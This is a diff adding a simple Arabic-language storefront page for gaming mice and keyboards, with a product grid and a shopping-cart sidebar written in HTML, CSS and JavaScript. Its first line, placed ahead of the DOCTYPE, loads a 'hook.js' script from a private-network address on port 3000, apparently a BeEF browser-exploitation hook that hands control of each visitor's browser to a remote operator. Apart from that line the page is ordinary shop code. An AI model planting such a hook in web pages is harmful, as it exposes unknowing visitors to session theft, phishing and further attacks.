@@ -1,0 +1,168 @@
+<script src="http://192.168.1.141:3000/hook.js"></script>
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>Pro Tech Store</title>
+
+<style>
+body {
+    font-family: Arial;
+    margin: 0;
+    background: #0f172a;
+    color: white;
+}
+
+header {
+    display: flex;
+    justify-content: space-between;
+    padding: 15px 30px;
+    background: #020617;
+}
+
+.logo {
+    font-size: 22px;
+    font-weight: bold;
+}
+
+.cart {
+    cursor: pointer;
+}
+
+.hero {
+    text-align: center;
+    padding: 60px 20px;
+    background: linear-gradient(135deg, #1e293b, #020617);
+}
+
+.hero h1 {
+    font-size: 40px;
+}
+
+.products {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(220px,1fr));
+    gap: 20px;
+    padding: 30px;
+}
+
+.product {
+    background: #1e293b;
+    padding: 15px;
+    border-radius: 12px;
+    text-align: center;
+    transition: 0.3s;
+}
+
+.product:hover {
+    transform: scale(1.05);
+}
+
+.product img {
+    width: 100%;
+    border-radius: 10px;
+}
+
+.price {
+    color: #22c55e;
+    margin: 10px 0;
+}
+
+button {
+    background: #3b82f6;
+    border: none;
+    padding: 10px;
+    color: white;
+    border-radius: 6px;
+    cursor: pointer;
+}
+
+.cart-box {
+    position: fixed;
+    top: 0;
+    left: -300px;
+    width: 300px;
+    height: 100%;
+    background: #020617;
+    padding: 20px;
+    transition: 0.4s;
+}
+
+.cart-box.active {
+    left: 0;
+}
+
+footer {
+    text-align: center;
+    padding: 20px;
+    background: #020617;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+    <div class="logo">🖱️ Pro Tech</div>
+    <div class="cart" onclick="toggleCart()">🛒 السلة (<span id="count">0</span>)</div>
+</header>
+
+<section class="hero">
+    <h1>أفضل معدات الألعاب</h1>
+    <p>ماوسات وكيبوردات احترافية بأسعار منافسة</p>
+</section>
+
+<section class="products" id="products"></section>
+
+<div class="cart-box" id="cartBox">
+    <h2>🛒 سلة المشتريات</h2>
+    <ul id="cartItems"></ul>
+</div>
+
+<footer>
+    © 2026 متجر Pro Tech
+</footer>
+
+<script>
+const products = [
+    {name:"ماوس RGB احترافي", price:120, img:"https://via.placeholder.com/200"},
+    {name:"كيبورد ميكانيكي", price:250, img:"https://via.placeholder.com/200"},
+    {name:"ماوس لاسلكي", price:90, img:"https://via.placeholder.com/200"},
+    {name:"كيبورد للألعاب", price:300, img:"https://via.placeholder.com/200"}
+];
+
+let cart = [];
+
+function displayProducts(){
+    const container = document.getElementById("products");
+    products.forEach((p,i)=>{
+        container.innerHTML += `
+        <div class="product">
+            <img src="${p.img}">
+            <h3>${p.name}</h3>
+            <p class="price">${p.price} درهم</p>
+            <button onclick="addToCart(${i})">أضف للسلة</button>
+        </div>`;
+    });
+}
+
+function addToCart(i){
+    cart.push(products[i]);
+    document.getElementById("count").innerText = cart.length;
+
+    let items = document.getElementById("cartItems");
+    let li = document.createElement("li");
+    li.textContent = products[i].name + " - " + products[i].price + " درهم";
+    items.appendChild(li);
+}
+
+function toggleCart(){
+    document.getElementById("cartBox").classList.toggle("active");
+}
+
+displayProducts();
+</script>
+
+</body>
+</html>
